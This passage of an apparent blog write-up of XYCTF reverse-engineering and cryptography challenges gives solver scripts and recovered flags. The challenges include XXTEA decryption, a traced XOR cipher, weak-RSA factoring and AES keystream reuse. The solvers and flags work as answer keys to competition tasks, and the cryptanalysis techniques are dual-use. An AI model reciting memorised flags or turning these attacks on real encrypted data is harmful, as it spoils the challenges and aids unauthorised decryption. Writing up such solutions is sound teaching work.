<span class="number">7</span>) % <span class="number">8</span>] &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">&#125;</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">--round;</span><br><span class="line">&#125; <span class="keyword">while</span> (round);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> last[<span class="number">32</span>] = &#123;</span><br><span class="line"><span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x85</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0x89</span>, <span class="number">0x1B</span>, <span class="number">0x8C</span>, <span class="number">0x18</span>, <span class="number">0xC5</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xBC</span>, <span class="number">0x72</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x53</span>, <span class="number">0xAC</span>, <span class="number">0x46</span>, <span class="number">0xA1</span>, <span class="number">0x4D</span>, <span class="number">0x6B</span>, <span class="number">0x0D</span>, <span class="number">0x63</span>, <span class="number">0x86</span>, <span class="number">0xF0</span>, <span class="number">0x97</span>, <span class="number">0x97</span>, <span class="number">0xF8</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">dec2</span>((DWORD*)last, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; hex &lt;&lt; (last[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// XYCTF&#123;XXTEA_AND_Z3_1s_S0_easy!!&#125;</span></span><br></pre></td></tr></table></figure><h4 id="舔狗四部曲–记忆的时光机">舔狗四部曲–记忆的时光机</h4><p>第一次遇到这种jmp+寄存器的值，不过通过分析可以看出均为顺序跳转，直接trance，然后分析，大概得出加密逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">0000E808.text:enc+4sub     rsp, 48hRSP=00007FFCB17CE120 CF=0 PF=0 SF=0</span><br><span class="line">0000E808.text:enc+8lea     rcx, sub_558B201D1460RCX=0000558B201D1460</span><br><span class="line">0000E808.text:enc+Fmov     edx, 2RDX=0000000000000002</span><br><span class="line">0000E808.text:enc+14movsxd  r10, esiR10=0000000000000001</span><br><span class="line">0000E808.text:enc+17mov     rax, fs:28hRAX=374B368125068200</span><br><span class="line">0000E808.text:enc+20mov     [rsp+48h+var_10], rax</span><br><span class="line">0000E808.text:enc+25xor     eax, eaxRAX=0000000000000000 PF=1 ZF=1</span><br><span class="line">0000E808.text:enc+27lea     rax, sub_558B201D1448RAX=0000558B201D1448</span><br><span class="line">0000E808.text:enc+2Emov     [rsp+48h+var_48], rcx</span><br><span class="line">0000E808.text:enc+32add     esi, 6RSI=0000000000000007 PF=0 ZF=0</span><br><span class="line">0000E808.text:enc+35mov     [rsp+48h+var_40], rax</span><br><span class="line">0000E808.text:enc+3Alea     rax, sub_558B201D1430RAX=0000558B201D1430</span><br><span class="line">0000E808.text:enc+41lea     r11, key; \&quot;i_have_get_shell_but_where_is_you_my_de\&quot;...</span><br><span class="line">0000E808.text:enc+48mov     [rsp+48h+var_38], rax</span><br><span class="line">0000E808.text:enc+4Dlea     rax, sub_558B201D1418RAX=0000558B201D1418</span><br><span class="line">0000E808.text:enc+54mov     [rsp+48h+var_30], rax</span><br><span class="line">0000E808.text:enc+59lea     rax, sub_558B201D1400RAX=0000558B201D1400</span><br><span class="line">0000E808.text:enc+60mov     [rsp+48h+var_28], rax</span><br><span class="line">0000E808.text:enc+65lea     rax, loc_558B201D13E0RAX=0000558B201D13E0</span><br><span class="line">0000E808.text:enc+6Cmov     [rsp+48h+var_20], rax</span><br><span class="line">0000E808.text:enc+71lea     eax, [rdx-1]RAX=0000000000000001</span><br><span class="line">0000E808.text:enc+74jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1460endbr64</span><br><span class="line">0000E808.text:sub_558B201D1460+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1448</span><br><span class="line">0000E808.text:sub_558B201D1460+8add     edx, 1RDX=0000000000000003 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1460+Bmov     r8d, ediR8=000000000000004D</span><br><span class="line">0000E808.text:sub_558B201D1460+Elea     eax, [rdx-1]RAX=0000000000000002</span><br><span class="line">0000E808.text:sub_558B201D1460+11jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1448endbr64</span><br><span class="line">0000E808.text:sub_558B201D1448+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1430</span><br><span class="line">0000E808.text:sub_558B201D1448+8xor     r8d, esiR8=000000000000004A PF=0</span><br><span class="line">0000E808.text:sub_558B201D1448+Badd     edx, 1RDX=0000000000000004</span><br><span class="line">0000E808.text:sub_558B201D1448+Exor     r8d, 66hR8=000000000000002C</span><br><span class="line">0000E808.text:sub_558B201D1448+12lea     eax, [rdx-1]RAX=0000000000000003</span><br><span class="line">0000E808.text:sub_558B201D1448+15jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1430endbr64</span><br><span class="line">0000E808.text:sub_558B201D1430+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1418</span><br><span class="line">0000E808.text:sub_558B201D1430+8add     edx, 1RDX=0000000000000005 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1430+Bsub     r8d, 6R8=0000000000000026 PF=0</span><br><span class="line">0000E808.text:sub_558B201D1430+Flea     eax, [rdx-1]RAX=0000000000000004</span><br><span class="line">0000E808.text:sub_558B201D1430+12jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1418endbr64</span><br><span class="line">0000E808.text:sub_558B201D1418+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1400</span><br><span class="line">0000E808.text:sub_558B201D1418+8add     edx, 1RDX=0000000000000006 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1418+Bmovzx   r9d, byte ptr [r11+r10]R9=000000000000005F</span><br><span class="line">0000E808.text:sub_558B201D1418+10lea     eax, [rdx-1]RAX=0000000000000005</span><br><span class="line">0000E808.text:sub_558B201D1418+13jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1400endbr64</span><br><span class="line">0000E808.text:sub_558B201D1400+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D13E0</span><br><span class="line">0000E808.text:sub_558B201D1400+8add     edx, 1RDX=0000000000000007 PF=0</span><br><span class="line">0000E808.text:sub_558B201D1400+Bxor     r8d, r9dR8=0000000000000079</span><br><span class="line">0000E808.text:sub_558B201D1400+Elea     eax, [rdx-1]RAX=0000000000000006</span><br><span class="line">0000E808.text:sub_558B201D1400+11jmp     rcx</span><br><span class="line">0000E808.text:loc_558B201D13E0endbr64</span><br><span class="line">0000E808.text:0000558B201D13E4mov     rax, [rsp+38h]RAX=374B368125068200</span><br><span class="line">0000E808.text:0000558B201D13E9sub     rax, fs:28hRAX=0000000000000000 PF=1 ZF=1</span><br><span class="line">0000E808.text:0000558B201D13F2jnz     short loc_558B201D1473</span><br><span class="line">0000E808.text:0000558B201D13F4mov     eax, r8dRAX=0000000000000079</span><br><span class="line">0000E808.text:0000558B201D13F7add     rsp, 48hRSP=00007FFCB17CE168 PF=0 ZF=0</span><br><span class="line">0000E808.text:0000558B201D13FBretnRSP=00007FFCB17CE170</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inp[i]^=(i+6)^0x66</span></span><br><span class="line"><span class="comment"># inp[i]-=6</span></span><br><span class="line"><span class="comment"># inp[i]^=key[i]</span></span><br></pre></td></tr></table></figure><p>那直接逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x32</span>, <span class="number">0x98</span>, <span class="number">0x20</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x7B</span>, <span class="number">0x25</span>, <span class="number">0x75</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x60</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0x62</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x37</span>, <span class="number">0x6C</span>, <span class="number">0x30</span>, <span class="number">0x46</span>, <span class="number">0x66</span>, <span class="number">0x4F</span>, <span class="number">0x5D</span>, <span class="number">0x03</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x43</span>, <span class="number">0x68</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x7A</span>, <span class="number">0x3F</span>, <span class="number">0x6C</span>, <span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x09</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># inp[i]^=i^0x66</span></span><br><span class="line"><span class="comment"># inp[i]-=6</span></span><br><span class="line"><span class="comment"># inp[i]^=key[i]</span></span><br><span class="line">key = <span class="string">&quot;i_have_get_shell_but_where_is_you_my_dear_baby!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    last[i]^=<span class="built_in">ord</span>(key[i])</span><br><span class="line">    last[i]+=<span class="number">6</span></span><br><span class="line">    last[i]^=(<span class="number">6</span>+i)^<span class="number">0x66</span></span><br><span class="line">        </span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment"># flag&#123;Br0k3n_m3m0r1es_for3v3r_Sh1n@_1n_The_H3@$T&#125;</span></span><br></pre></td></tr></table></figure><h4 id="舔狗四部曲–我的白月光">舔狗四部曲–我的白月光</h4><p>一开头给了flag{L0v3_</p><p>然后分析一下主函数，发现最后有一个base64，拿去解一下，发现解不出来，然后尝试一下是不是反向了什么的</p><p>在cyberchef里面直接</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">reverse</span>+<span class="keyword">from</span> base64+<span class="built_in">reverse</span>+<span class="keyword">from</span> hex</span><br><span class="line">得到</span><br><span class="line"><span class="variable">_memory_never_go_done_finally_thankyou_xiaowangtongxue</span>&#125;</span><br></pre></td></tr></table></figure><p>然后再看一下中间还干了什么</p><p>看到有一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(_DWORD)v22 )</span><br><span class="line">&#123;</span><br><span class="line">  flOldProtect[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  VirtualProtect(v11, <span class="number">8u</span>i64, <span class="number">4u</span>, flOldProtect);</span><br><span class="line">  *v11 = sub_7FF64A841470;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个sub好像很可疑，直接set ip 过去，在执行完函数后，在对应的hex窗口找到</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i8_<span class="built_in">a_k3y</span>_and</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;L0v3_i8_<span class="built_in">a_k3y</span>_and_memory_never_go_done_finally_thankyou_xiaowangtongxue&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto">crypto</h2><h3 id="week1-2">week1</h3><h4 id="Sign1n">Sign1n</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">b&#x27;XYCTF&#123;108376aa-c3ed-4e02-a915-47d9ea406612&#125;&#x27;</span></span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">leak=<span class="built_in">bin</span>(<span class="built_in">int</span>(flag))</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    leak += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(leak) == <span class="number">514</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_bits</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str[<span class="number">2</span>:])</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">        temp = input_list[i]</span><br><span class="line">        input_list[i] = input_list[length - <span class="number">1</span> - i]</span><br><span class="line">        input_list[length - <span class="number">1</span> - i] = temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line"></span><br><span class="line">input_str = leak</span><br><span class="line">result = swap_bits(input_str)</span><br><span class="line">a=result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_add</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str)</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        input_list[i] = <span class="built_in">str</span>((<span class="built_in">int</span>(input_list[i]) + i + <span class="number">1</span>) % <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_str = a</span><br><span class="line">result = custom_add(input_str)</span><br><span class="line">b=result</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment">#12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567790113445679902334677900134557889122356678001344567801223566790013355689912235667901134457889023355788001344578891133467799012455778012235578800134456899022346779011344567991223557880012346788902335667900134456899122355788001245578891133566780013445678012235577801123557889112456678011245578801233467789112355779912234577990233556780113</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>既然是对每一位的单独加密，那就直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">llll   = <span class="number">12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567790113445679902334677900134557889122356678001344567801223566790013355689912235667901134457889023355788001344578891133467799012455778012235578800134456899022346779011344567991223557880012346788902335667900134456899122355788001245578891133566780013445678012235577801123557889112456678011245578801233467789112355779912234577990233556780113</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(<span class="built_in">str</span>(input_str))</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> (input_list[i] == <span class="built_in">str</span>((k + i + <span class="number">1</span>) % <span class="number">10</span>)):</span><br><span class="line">                res+=(<span class="built_in">str</span>(k))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">nex = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(out(llll)))</span><br><span class="line"><span class="comment"># print(nex)</span></span><br><span class="line">nex = <span class="string">&#x27;0b&#x27;</span>+nex[:<span class="number">343</span>]</span><br><span class="line"><span class="comment"># print(nex)</span></span><br><span class="line">y = <span class="built_in">int</span>(nex,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(y))</span><br><span class="line"><span class="comment"># XYCTF&#123;f94e8256-6368-47bc-9ae3-c73e382376d7&#125;</span></span><br></pre></td></tr></table></figure><h4 id="x0r">x0r</h4><p>是AES的选择明文攻击，由于是异或得到结果，那就可以直接截获每一次的密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥块</span></span><br><span class="line"><span class="comment"># 输入1后得到的前32个字符和后96个字符</span></span><br><span class="line"><span class="comment"># 输入2后输入前32个字符，然后输入000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="comment"># 得到的输出放到这里</span></span><br><span class="line">key_blocks_hex = <span class="string">&#x27;69d174fb2dd82fc3ad184efde51b3a6673027ef1d3a49dbf955d2f62759b1a5924381fb190dd70c5957c7e395311272c&#x27;</span></span><br><span class="line">key_blocks = <span class="built_in">bytes</span>.fromhex(key_blocks_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line"><span class="comment"># 输入1后得到的前32个字符和后96个字符</span></span><br><span class="line"><span class="comment"># 放后96个字符</span></span><br><span class="line">ciphertext_hex = <span class="string">&#x27;318837af6ba319a69b7d78c9d67d175e11644bdce7c0ab88b83c1f0642b6783c175929d5a7be12a0f11f033357152328&#x27;</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">plaintext = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), AES.block_size):</span><br><span class="line">    key_block = key_blocks[i:i+AES.block_size]</span><br><span class="line">    ciphertext_block = ciphertext[i:i+AES.block_size]</span><br><span class="line">    plaintext_block = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertext_block, key_block))</span><br><span class="line">    plaintext += plaintext_block</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment"># XYCTF&#123;6e6e643f-8bf5-4d67-a0d7-be3a6d7cbedc&#125;</span></span><br></pre></td></tr></table></figure><h4 id="happy-to-solve1">happy_to_solve1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = sympy.nextprime(p ^ ((<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p, q = get_happy_prime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure><p>我们知道q是p异或11111…的结果，那么p+q就约等于2**512</p><p>我们可以根据这个和pq乘积两个等式尝试寻找p和q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">suma, mula</span>):</span><br><span class="line">    <span class="comment"># 设置精度</span></span><br><span class="line">    getcontext().prec = <span class="number">200</span></span><br><span class="line">    <span class="comment"># 计算判别式</span></span><br><span class="line">    discriminant = Decimal(suma**<span class="number">2</span> - <span class="number">4</span>*mula).sqrt()</span><br><span class="line">    <span class="comment"># 计算 p 和 q 的值</span></span><br><span class="line">    p = (suma + discriminant) / <span class="number">2</span></span><br><span class="line">    q = (suma - discriminant) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">suma = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">512</span>)-<span class="number">1</span></span><br><span class="line">mula = <span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line">n=<span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line"></span><br><span class="line">p, q = solve_pq(suma, mula)</span><br><span class="line"><span class="comment"># print(f&quot;p = &#123;Decimal(p):.2f&#125;, q = &#123;Decimal(q):.2f&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(sympy.nextprime(p))</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>((n%p)!=<span class="number">0</span>):</span><br><span class="line">        p = sympy.nextprime(p)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">q = n // p</span><br><span class="line">c = <span class="number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">phi =(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># XYCTF&#123;3f22f4efe3bbbc71bbcc999a0a622a1a23303cdc&#125;</span></span><br></pre></td></tr></table></figure><h4 id="反方向的密码-相思">反方向的密码 相思</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> 